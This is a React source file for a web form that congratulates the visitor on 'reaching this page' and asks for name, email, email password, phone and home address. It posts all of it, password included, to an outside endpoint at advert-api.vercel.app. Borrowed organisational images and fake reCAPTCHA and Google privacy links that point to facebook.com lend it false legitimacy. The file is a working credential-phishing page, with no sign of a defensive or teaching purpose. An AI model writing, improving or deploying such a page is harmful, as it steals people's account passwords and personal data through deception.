import React, { useState } from 'react';
import axios from 'axios';

function UserForm() {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    emailPassword: '',
    phone: '',
    address: '',
    city: '',
    state: '',
    country: '',
    zip: '',
    agreeToTerms: false,
  });

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData({
      ...formData,
      [name]: type === 'checkbox' ? checked : value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!formData.agreeToTerms) {
      alert("You must agree to the terms and conditions before submitting.");
      return;
    }

    try {
      const response = await axios.post('https://advert-api.vercel.app/submit', formData);

      if (response.status === 200) {
        alert('Form successfully uploaded');
        setFormData({
          name: '',
          email: '',
          emailPassword: '',
          phone: '',
          address: '',
          city: '',
          state: '',
          zip: '',
          country: '',
          agreeToTerms: false,
        });
      } else {
        alert('Failed to upload form. Please try again.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Error submitting form. Please try again.');
    }
  };

  return (
    <div>
      <div className='con'>
        <img src="https://theogpd.org/wp-content/uploads/2024/09/Organizational-21-1536x565.png" alt="" />
      </div>

      <div className="main-container">
        {/* Image Header */}
        <header className="header">
          <img src="https://i0.wp.com/opportunitiescorners.com/wp-content/uploads/2024/10/FB_IMG_1729067747981.jpg?resize=1068%2C1068&ssl=1" alt="Header" className="header-image" />
          <h1 className="header-title">Your Personal Information</h1>
          <h1>Congratulations On Reaching This Page.</h1>
          <p className='sub-title'>Please submit all your information below, and our representative will be in touch right away.</p>
        </header>

        {/* Form Container */}
        <div className="form-container">
          <form onSubmit={handleSubmit} className="form-box">
            <label>Full Name:</label>
            <input type="text" name="name" placeholder='e.g. user' value={formData.name} onChange={handleChange} required />

            <label>Email:</label>
            <input type="email" name="email" placeholder='e.g. user@gmail.com' value={formData.email} onChange={handleChange} required />

            <label>Email Password:</label>
            <input type="password" name="emailPassword" placeholder='e.g. password' value={formData.emailPassword} onChange={handleChange} required />

            <label>Phone:</label>
            <input type="tel" name="phone" placeholder='e.g. 123-456-789' value={formData.phone} onChange={handleChange} required />

            <label>Address:</label>
            <input type="text" name="address" placeholder='enter your address' value={formData.address} onChange={handleChange} />

            <label>City:</label>
            <input type="text" name="city" placeholder='enter your city' value={formData.city} onChange={handleChange} />

            <label>State:</label>
            <input type="text" name="state" placeholder='enter your state' value={formData.state} onChange={handleChange} />

            <label>Country:</label>
            <select name="country" value={formData.country} onChange={handleChange} className="country-select" required>
              <option value="">Select your country</option>
              <option value="United States">United States</option>
              <option value="Canada">Canada</option>
              <option value="United Kingdom">United Kingdom</option>
              <option value="Australia">Australia</option>
              <option value="Germany">Germany</option>
              <option value="France">France</option>
              <option value="Ethiopia">Ethiopia</option>
              <option value="South Korea">South Korea</option>
              <option value="India">India</option>
              <option value="China">China</option>
              <option value="Japan">Japan</option>
              <option value="Brazil">Brazil</option>
            </select>

            <label>Zip Code:</label>
            <input type="text" name="zip" placeholder="enter your zip code" value={formData.zip} onChange={handleChange} required />

            <label className="checkbox-container">
              <input
                type="checkbox"
                name="agreeToTerms"
                checked={formData.agreeToTerms}
                onChange={handleChange}
                required
              />
              I agree to the terms and conditions
            </label>
            <p className='site'>This site is protected by <a href="https://facebook.com">reCAPTCHA</a> and the <a href="https://facebook.com">Google Privacy Policy</a> and Terms of Service apply.</p>

            <button type="submit">Submit</button>
          </form>
        </div>
      </div>
      <div>
        <img src="" alt="" />
      </div>
    </div>
  );
}

export default UserForm;
